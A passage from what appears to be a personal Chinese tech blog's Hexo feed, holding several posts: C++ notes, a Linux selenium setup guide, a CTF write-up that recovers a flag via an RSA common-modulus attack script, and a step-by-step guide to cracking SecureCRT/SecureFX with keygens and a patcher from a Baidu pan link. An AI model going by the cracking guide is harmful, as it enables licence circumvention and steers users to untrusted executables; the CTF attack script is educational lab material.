<li><a href="https://www.runoob.com/cplusplus/cpp-examples-factorial.html">C++ 实例 - 求一个数的阶乘</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-pyramid-pattern.html">C++ 实例 - 创建各类三角形图案</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-hcf-gcd.html">C++ 实例 - 求两数的最大公约数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-lcm.html">C++ 实例 - 求两数最小公倍数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-calculator-switch-case.html">C++ 实例 - 实现一个简单的计算器</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-monkey-eating-peach.html">猴子吃桃问题</a></li>
</ul>
]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>notes</tag>
      </tags>
  </entry>
  <entry>
    <title>SecureCRT+SecureFx软件安装破解</title>
    <url>/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>SecureCRT是一款支持SSH(SSH1和SSH2)的终端仿真程序,简单地说是Windows下登录UNIX或Linux服务器主机的软件。</p>
<p>SecureFX是和SecureCRT配套的客户端文件传输程序,废话不多说开始吧，下载链接在文末</p>
<a id="more"></a>
<p>1、首先下载需要的安装程序（链接在文末），第一个是安装程序，后两个是各自的注册机</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621153619976.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>2、双击scrt_sfx81-x64.exe开始安装，选择next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621153844649.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择接受协议-》next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621153911788.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>第一个选项是对电脑所有用户都好使，第二个为当前用户，直接next就行</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621153949127.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>注意：第一个Complete安装是默认安装位置在C盘，我不喜欢装软件在C盘，这里我们选择Custom-》next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154044674.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>点击“change”选择安装目录-》next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154255564.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>上面两个选项根据需要选吧-》next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154346796.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择install开始安装最后finish，</p>
<p>2、解压SecureCRT keygen.zip压缩包，把SecureCRT keygen.exe放到SecureCRT的安装目录，（很重要）我这里是E:\Secure_CRT_FX，然后以管理员方式运行</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154550481.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择patch-》选中SecureCRT安装路径的SecureCRT.exe程序</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154705969.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后弹出成功框-》点击确定-》选择LicenseHelper.exe</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154836127.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154855240.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后点确定就行了(注意不要关闭这个窗口，后面还要用）</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154942338.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后运行SecureCRT程序-》选择Enter License Data…</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155040697.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>直接点击下一步</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155112679.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择Enter License Manually</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155127327.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后把刚才注册机的页面信息对应填到这个页面——》下一步</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155324737.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后把对应的Serial number和License key填上-》下一步</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155418951.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后把Issue date填上，第二个框不用填-》下一步（注意：这时候左边这个窗口不要关，后面注册SecureFX要用）</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155558451.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>注册完成，点击完成</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155645108.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择是否创建口令，看个人吧，这里直接选第二个</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155801170.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后就可以使用了</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/202006211559062.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>3、和第二步同样的步骤，把SecureFX keygen.zip解压然后注册吧</p>
<p>不同的是需要点击patch后—》点击Generate生成序列号等信息，后面和第二步等同</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621162506596.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>百度网盘资源下载：</p>
<p>链接：<a href="https://pan.baidu.com/s/1zCHnCyaL7tACEwv_2XpCEg">https://pan.baidu.com/s/1zCHnCyaL7tACEwv_2XpCEg</a><br>提取码：97z2</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>best_rsa</title>
    <url>/2020/10/12/best-rsa/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=1&amp;id=5450&amp;page=2">题目地址</a></p>
<p>题目名称：best_rsa</p>
<p>题目描述：暂无</p>
<p>题目附件：<a href="https://adworld.xctf.org.cn/media/task/attachments/c2d6e7158d7b4cd6a747774f0bdc5f72.zip">附件1</a></p>
<a id="more"></a>
<p>WriteUp：</p>
<p>解题思路：</p>
<p>下载附件，解压后打开文件夹，包含4个文件</p>
<p><img src="/2020/10/12/best-rsa/image-20201012110935219.png" alt="image-20201012110935219"></p>
<p>给出了2个公钥文件和和2个密文文件，用常规的RSA解密方式分别解密，解密失败（n为2048位难以分解）</p>
<p>猜想应该是同一个明文，使用了2个不同的公钥加密得到了不同的密文，对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致<strong>共模攻击</strong></p>
<p><strong>共模攻击适用情况：</strong>明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1也就是e1和e2互质</p>
<p><strong>解题过程:</strong></p>
<p>判断e1和e2是否互质的python3脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="comment">#判断两个数是否互素</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span>  <span class="comment"># 判断来两个数是否互素,辗转相除法</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b, a % b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    x = <span class="number">117</span>  <span class="comment"># x,y的值根据需要修改即可</span></span><br><span class="line">    y = <span class="number">65537</span></span><br><span class="line">    <span class="keyword">if</span> gcd(x, y) == <span class="number">1</span>:  <span class="comment"># 如果两个数的最大公约数是1，那么两数互素。</span></span><br><span class="line">        print(str(x) + <span class="string">&quot; &quot;</span> + str(y) + <span class="string">&quot;  两个数互素&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(str(x) + <span class="string">&quot; &quot;</span> + str(y) + <span class="string">&quot; 两个数不互素&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>共模攻击python3解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment">#若给出公钥文件，从公钥文件中分解出n和e</span></span><br><span class="line">public_key1 = RSA.importKey(open(<span class="string">r&quot;G:\ctf\CTF题目\c2d6e7158d7b4cd6a747774f0bdc5f72\publickey1.pem&quot;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">public_key2 = RSA.importKey(open(<span class="string">r&quot;G:\ctf\CTF题目\c2d6e7158d7b4cd6a747774f0bdc5f72\publickey2.pem&quot;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="comment">#int型</span></span><br><span class="line">n1 = public_key1.n</span><br><span class="line">e1 = public_key1.e</span><br><span class="line">n2 = public_key2.n</span><br><span class="line">e2 = public_key2.e</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n1==n2</span><br><span class="line">n=n1</span><br><span class="line"></span><br><span class="line"><span class="comment">#若直接给出e1、e2、n</span></span><br><span class="line"><span class="comment"># e1 = 117</span></span><br><span class="line"><span class="comment"># e2 = 65537</span></span><br><span class="line"><span class="comment"># n =0x67755F890795644EC27E68892B94042C78334C34F9A6D8B6AA488D9B424D64A8B9B2DCC91B1D098A09D7AC4F9A06A4B5267F88F8968B4BAD29235D9A80330845F126B9A865F44C7A77DF72F763F553E99020745F40C8D97F0AB906154FBB1020B588F441F712B2377505B644FE36A78743EE4995B42C7B17B8DF4782EBB595097EE1BE74143261893C4EE2C140DC469E32B17F8AB30E25F07164506B4E79C6B4E3AF5BEA0268427FFB1134FB90A5122729C4EEF17B6D0B12CFBA4E7F14E27AA3C2B4F978E75163242EBD5CBD73829336F9A120E86E25D69CAE0229FDCCEB5B35DC630187B0EEF1532EEC546F4037A6EAB0D0207199B9566011A52F8E9ACD7261</span></span><br><span class="line"></span><br><span class="line">c1=bytes_to_long(open(<span class="string">r&#x27;G:\ctf\CTF题目\c2d6e7158d7b4cd6a747774f0bdc5f72\cipher1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())  </span><br><span class="line">c2=bytes_to_long(open(<span class="string">r&#x27;G:\ctf\CTF题目\c2d6e7158d7b4cd6a747774f0bdc5f72\cipher2.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()) </span><br><span class="line"></span><br><span class="line">_, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line"></span><br><span class="line">m = pow(c1, r, n) * pow(c2, s, n) % n</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="/2020/10/12/best-rsa/image-20201012112318371.png" alt="image-20201012112318371"></p>
<p>得到flag为：flag{interesting_rsa}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CRYPTO</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>同模攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>c&amp;c++</title>
    <url>/2020/11/02/c-c/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>通常我们对类成员进行“初始化”有两种方式：</p>
<ol>
<li>构造函数后面跟冒号；</li>
<li>构造函数里面对成员进行赋值。</li>
</ol>
<a id="more"></a>
<hr>
<p>const和引用必须在声明的时候就初始化，换句话说就是在给const和引用类型变量分配内存的时候就初始化。</p>
<hr>
<p>根据C++的规则，const类型和引用不可以被赋值，只能被初始化。</p>
<hr>
<p>实在构造函数里面调用等于号并不是真正意义上的“初始化”。这个过程相当于：</p>
<ol>
<li>系统创建成员变量；</li>
<li>创建完后再进行赋值操作。</li>
</ol>
<p>而在构造函数后面跟冒号，就相当于：</p>
<ol>
<li>系统创建成员变量并且初始化。也就是系统为成员变量分配了一块内存并且把相应的数据给填了进去。而构造函数里面调用等于号的方式是分配好后再进行赋值，多了一个步骤。</li>
</ol>
<p><strong>构造函数后面跟的冒号代码是在进入构造函数并且在括号里面的第一行代码之前被执行。</strong></p>
<p><strong>通俗的讲，构造函数后面的冒号就是初始化，而括号里面的等于号并不是初始化，而是变量生成以后的赋值而已（永远都是2个步骤）。</strong></p>
<p><strong>引用b初始化完成后，就永远指向初始化时候的那个变量，无法再改变了。</strong>我这里的“引用不可以被赋值”是指不能给引用本身赋值来改变它的指向，并不是说不可以改变引用指向的内存的内容。</p>
<hr>
<p>数组名是指向数组中第一个元素的常量指针</p>
]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>notes</tag>
      </tags>
  </entry>
  <entry>
    <title>Confusion and thinking</title>
    <url>/2020/11/04/confusion/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本篇文章记录一下学习过程中遇到的一些问题和思考？仅此记录一下，或许随着不断地成长都会得到答案😮</p>
<a id="more"></a>
<ol>
<li>leetcode题要把题解都过一遍然后分析寻找最优解吗？学的更好但需要时间更多，还是说多刷题，量变产生质变？</li>
<li>目前还比较菜，LeetCode周赛有必要参加吗，参加了有必要写题解吗？中等题有一定挑战，难题根本没做过。选择：先刷简单题，参加周赛但是题解</li>
</ol>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
  </entry>
  <entry>
    <title>Encouragement</title>
    <url>/2020/11/04/encouragement/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这篇文章放一些鸡汤吧，觉得看完还是能燃起斗志的，失落迷茫时看看吧😗</p>
<a id="more"></a>
<p>1</p>
<iframe src="//player.bilibili.com/player.html?aid=89823016&bvid=BV1Y741177jt&cid=153411753&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>







<p>2</p>
<iframe src="//player.bilibili.com/player.html?aid=40885499&bvid=BV1Vt411p7RC&cid=71807757&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>3</p>
<iframe src="//player.bilibili.com/player.html?aid=24486739&bvid=BV12W411A7dj&cid=41124302&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>4</p>
<iframe src="//player.bilibili.com/player.html?aid=839716400&bvid=BV1754y1172R&cid=239329026&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>5</p>
<iframe src="//player.bilibili.com/player.html?aid=837773988&bvid=BV1Cg4y187uN&cid=181357145&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>6</p>
<iframe src="//player.bilibili.com/player.html?aid=81913831&bvid=BV1rJ411j7ym&cid=140164477&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>7</p>
<iframe src="//player.bilibili.com/player.html?aid=79350389&bvid=BV1gJ411k7Ts&cid=135791676&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>8</p>
<iframe src="//player.bilibili.com/player.html?aid=62372508&bvid=BV1dt411M7xH&cid=108408326&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>9</p>
<iframe src="//player.bilibili.com/player.html?aid=3523138&bvid=BV1Ms411R7zH&cid=5603916&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>10</p>
<iframe src="//player.bilibili.com/player.html?aid=200415421&bvid=BV1Tz411z7fS&cid=182472419&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

]]></content>
      <categories>
        <category>其他</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/10/09/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<a id="more"></a>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>test_MISC</title>
    <url>/2020/10/10/test-MISC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这只是一篇MISC分类的测试文章</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>linux下使用selenium模块</title>
    <url>/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h6 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h6><p>因为要在linux服务器上使用selenium模块实现“自动信息上报”的需求，在把python代码部署到linux服务器上的时候出现了一些环境配置上的问题，在一台服务器上摸索了好久也没成功问题一个接一个，难受😫，然后我就又重新缕清头绪在另一台服务器上重新部署了一下，成功了以后仅此记录一下，其他linux系统以后再摸索摸索吧😛</p>
<a id="more"></a>
<p><strong>查看linux版本</strong></p>
<p>我的系统是Red Hat 4.8.5。</p>
<p>命令：<code>cat /proc/version</code></p>
<p><img src="/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/image-20201103220335294.png" alt="image-20201103220335294"></p>
<p><strong>安装selenium模块</strong>（前提是已经装好了python3环境）</p>
<p>命令：<code>pip3 install selenium</code></p>
<p><strong>安装chrome</strong></p>
<p>命令：<code>yum install https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm</code></p>
<p>这个命令是下载安装最新的稳定的chrome版本，不是固定的版本，所以要注意下载chromedriver时要对应版本</p>
<p>我是在本地win10系统又下了一遍，解压可以看到chrome版本是86</p>
<p><img src="/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/image-20201103221418515.png" alt="image-20201103221418515"></p>
<p>注：如果运行程序出错：Cannot find Chrome binary，就是没有安装chrome</p>
<p><strong>安装依赖库</strong></p>
<p>命令：<code>yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 -y</code></p>
<p>注：如果没有安装依赖库会报错：error while loading shared libraries: libX11.so.6:</p>
<p><strong>安装chromedriver</strong>（驱动程序）</p>
<p>下载链接如下：<a href="http://chromedriver.storage.googleapis.com/index.html">点我下载</a>，一定要找到与上面chrome版本相应的版本，这里下载和上面对应的86版本</p>
<p><img src="/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/image-20201103221931864.png" alt="image-20201103221931864"></p>
<p>可以windows下载后然后传到服务器上，也可以直接使用wget命令下载</p>
<p>命令：<code>wget  http://chromedriver.storage.googleapis.com/index.html?path=86.0.4240.22/</code></p>
<p>然后给chromedriver 文件赋予可执行权限</p>
<p>命令：<code>chmod +x chromedriver</code> </p>
<p>然后放到环境变量PATH路径中</p>
<p>命令：<code>cp chromedriver /usr/bin/</code></p>
<p>可以查看chromedriver的版本号</p>
<p>命令：<code>chromedriver --version</code><img src="/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/image-20201103222408841.png" alt="image-20201103222408841"></p>
<p><strong>selenium代码测试</strong></p>
<p>在服务器上新建一个python文件，写入以下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">ch_options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment">#为Chrome配置无头模式</span></span><br><span class="line">ch_options.add_argument(<span class="string">&quot;--headless&quot;</span>)  </span><br><span class="line">ch_options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">ch_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">ch_options.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line"><span class="comment"># 在启动浏览器时加入配置</span></span><br><span class="line">dr = webdriver.Chrome(options=ch_options)</span><br><span class="line"><span class="comment">#这是测试网站</span></span><br><span class="line">url = <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">dr.get(url)</span><br><span class="line"><span class="comment">#打印源码</span></span><br><span class="line">print(dr.page_source)</span><br></pre></td></tr></table></figure>
<p>然后python执行这个py文件，结果打印出了源码，即selenium模块环境配置成功。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>Red Hat</tag>
      </tags>
  </entry>
  <entry>
    <title>test_PWN</title>
    <url>/2020/10/11/test-PWN/</url>
